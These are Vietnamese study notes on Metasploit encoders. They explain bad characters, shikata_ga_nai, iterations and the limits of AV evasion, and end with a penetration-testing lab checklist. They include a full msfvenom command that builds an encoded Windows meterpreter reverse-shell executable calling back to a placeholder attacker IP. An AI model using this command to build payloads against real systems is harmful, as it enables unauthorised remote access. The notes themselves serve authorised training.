# Metasploit Encoders

## Mục đích

Encoder trong Metasploit dùng để biến đổi byte của payload nhằm:

- Loại bỏ `bad characters`.
    
- Đáp ứng ràng buộc của exploit hoặc môi trường truyền payload.
    
- Thay đổi hình dạng byte của payload.
    
- Trước đây có thể hỗ trợ tránh một số static AV signature đơn giản.
    

> Encoding không đồng nghĩa với encryption và không bảo đảm AV bypass.

## Architecture

Payload và encoder phải tương thích với architecture:

- `x86`: 32-bit
    
- `x64`: 64-bit
    
- `sparc`
    
- `ppc`
    
- `mips`
    

Ví dụ:

```text
x86 payload → x86 encoder
x64 payload → x64 encoder
```

Encoder không tự chuyển payload x86 thành x64.

## Bad Characters

Bad characters là các byte không thể xuất hiện trong payload vì có thể làm payload bị cắt hoặc biến đổi.

Ví dụ:

```text
\x00 = null byte
\x0a = newline
\x0d = carriage return
```

Loại null byte với:

```bash
-b "\x00"
```

## Shikata Ga Nai

Encoder:

```text
x86/shikata_ga_nai
```

SGN là một `Polymorphic XOR Additive Feedback Encoder`.

Quy trình:

```text
Decoder stub + encoded payload
        ↓
Giải mã payload trong memory
        ↓
Thực thi payload gốc
```

SGN có thể tạo output byte khác nhau cho cùng một payload, nhưng antivirus/EDR hiện đại vẫn có thể nhận diện decoder stub và hành vi runtime.

## msfpayload, msfencode và msfvenom

Trước đây:

```text
msfpayload → tạo payload
msfencode  → encode payload
```

Hiện nay cả hai được hợp nhất trong:

```text
msfvenom
```

## Cú pháp msfvenom

```bash
msfvenom \
  -a x86 \
  --platform windows \
  -p windows/meterpreter/reverse_tcp \
  LHOST=<ATTACKER_IP> \
  LPORT=<LISTEN_PORT> \
  -e x86/shikata_ga_nai \
  -i 1 \
  -f exe \
  -o payload.exe
```

Các option:

- `-a x86`: architecture.
    
- `--platform windows`: hệ điều hành target.
    
- `-p`: payload.
    
- `LHOST`: IP máy nhận reverse connection.
    
- `LPORT`: port listener.
    
- `-e`: encoder.
    
- `-i`: số iteration.
    
- `-f`: output format.
    
- `-o`: output file.
    
- `-b`: bad characters cần loại bỏ.
    

## Xem encoder tương thích

Trong `msfconsole`:

```text
set payload windows/x64/meterpreter/reverse_tcp
show encoders
```

Metasploit chỉ hiển thị encoder tương thích với module, payload và architecture hiện tại.

## Iteration

```bash
-i 10
```

Encode payload 10 lần.

Nhiều iteration:

- Làm byte output thay đổi.
    
- Thường làm payload lớn hơn.
    
- Không bảo đảm tránh antivirus.
    
- Có thể vẫn bị phát hiện bởi signature, decoder stub hoặc hành vi runtime.
    

## AV Detection

Antivirus và EDR hiện đại có thể phát hiện dựa trên:

- Cấu trúc file PE.
    
- Known Metasploit templates.
    
- Decoder stub.
    
- Meterpreter behavior.
    
- Reverse connection.
    
- Memory allocation và execution.
    
- Process injection.
    
- Network indicators.
    

Do đó encoder chủ yếu nên được hiểu là công cụ xử lý ràng buộc payload, đặc biệt là bad characters, không phải giải pháp AV evasion đáng tin cậy.

# Lab Checklist

-  Xác định target OS.
    
-  Xác định target architecture: x86 hay x64.
    
-  Chọn payload phù hợp.
    
-  Cấu hình đúng `LHOST` và `LPORT`.
    
-  Xác định bad characters của exploit.
    
-  Dùng `show encoders` để xem encoder tương thích.
    
-  Chọn encoder đúng architecture.
    
-  Chỉ định iteration bằng `-i` nếu cần.
    
-  Chọn đúng output format với `-f`.
    
-  Lưu file vào thư mục có quyền ghi.
    
-  Tạo handler với đúng payload, LHOST và LPORT.
    
-  Kiểm tra callback trong môi trường lab được cấp phép.
    
-  Không mặc định rằng payload encoded sẽ vượt AV.
    
-  Không upload payload hoặc mẫu của khách hàng lên dịch vụ public khi chưa được phép.